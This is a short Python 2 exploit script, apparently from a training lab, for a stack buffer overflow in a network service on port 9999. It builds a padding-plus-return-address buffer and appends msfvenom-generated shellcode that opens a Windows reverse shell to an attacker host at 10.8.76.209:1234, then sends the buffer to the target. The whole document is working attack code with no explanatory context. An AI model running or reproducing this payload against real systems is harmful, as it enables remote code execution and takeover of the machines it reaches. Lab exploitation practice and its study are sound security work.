import socket
import sys
 
buff = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16
#msfvenom -p windows/shell_reverse_tcp LHOST=10.8.76.209 LPORT=1234 -f python -a x86 --platform windows -b "\x00"
buff += b"\xbf\xdf\x8d\x81\x5e\xdb\xc0\xd9\x74\x24\xf4\x5d\x2b"
buff += b"\xc9\xb1\x52\x83\xed\xfc\x31\x7d\x0e\x03\xa2\x83\x63"
buff += b"\xab\xa0\x74\xe1\x54\x58\x85\x86\xdd\xbd\xb4\x86\xba"
buff += b"\xb6\xe7\x36\xc8\x9a\x0b\xbc\x9c\x0e\x9f\xb0\x08\x21"
buff += b"\x28\x7e\x6f\x0c\xa9\xd3\x53\x0f\x29\x2e\x80\xef\x10"
buff += b"\xe1\xd5\xee\x55\x1c\x17\xa2\x0e\x6a\x8a\x52\x3a\x26"
buff += b"\x17\xd9\x70\xa6\x1f\x3e\xc0\xc9\x0e\x91\x5a\x90\x90"
buff += b"\x10\x8e\xa8\x98\x0a\xd3\x95\x53\xa1\x27\x61\x62\x63"
buff += b"\x76\x8a\xc9\x4a\xb6\x79\x13\x8b\x71\x62\x66\xe5\x81"
buff += b"\x1f\x71\x32\xfb\xfb\xf4\xa0\x5b\x8f\xaf\x0c\x5d\x5c"
buff += b"\x29\xc7\x51\x29\x3d\x8f\x75\xac\x92\xa4\x82\x25\x15"
buff += b"\x6a\x03\x7d\x32\xae\x4f\x25\x5b\xf7\x35\x88\x64\xe7"
buff += b"\x95\x75\xc1\x6c\x3b\x61\x78\x2f\x54\x46\xb1\xcf\xa4"
buff += b"\xc0\xc2\xbc\x96\x4f\x79\x2a\x9b\x18\xa7\xad\xdc\x32"
buff += b"\x1f\x21\x23\xbd\x60\x68\xe0\xe9\x30\x02\xc1\x91\xda"
buff += b"\xd2\xee\x47\x4c\x82\x40\x38\x2d\x72\x21\xe8\xc5\x98"
buff += b"\xae\xd7\xf6\xa3\x64\x70\x9c\x5e\xef\x75\x69\x2c\x3e"
buff += b"\xe1\x6b\xac\xc4\x20\xe2\x4a\xae\xd4\xa3\xc5\x47\x4c"
buff += b"\xee\x9d\xf6\x91\x24\xd8\x39\x19\xcb\x1d\xf7\xea\xa6"
buff += b"\x0d\x60\x1b\xfd\x6f\x27\x24\x2b\x07\xab\xb7\xb0\xd7"
buff += b"\xa2\xab\x6e\x80\xe3\x1a\x67\x44\x1e\x04\xd1\x7a\xe3"
buff += b"\xd0\x1a\x3e\x38\x21\xa4\xbf\xcd\x1d\x82\xaf\x0b\x9d"
buff += b"\x8e\x9b\xc3\xc8\x58\x75\xa2\xa2\x2a\x2f\x7c\x18\xe5"
buff += b"\xa7\xf9\x52\x36\xb1\x05\xbf\xc0\x5d\xb7\x16\x95\x62"
buff += b"\x78\xff\x11\x1b\x64\x9f\xde\xf6\x2c\xaf\x94\x5a\x04"
buff += b"\x38\x71\x0f\x14\x25\x82\xfa\x5b\x50\x01\x0e\x24\xa7"
buff += b"\x19\x7b\x21\xe3\x9d\x90\x5b\x7c\x48\x96\xc8\x7d\x59"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
    s.connect(('10.10.76.29', 9999))
 
except:
    print "Error"
    sys.exit(0)
 
s.recv(1024)
s.send(buff)

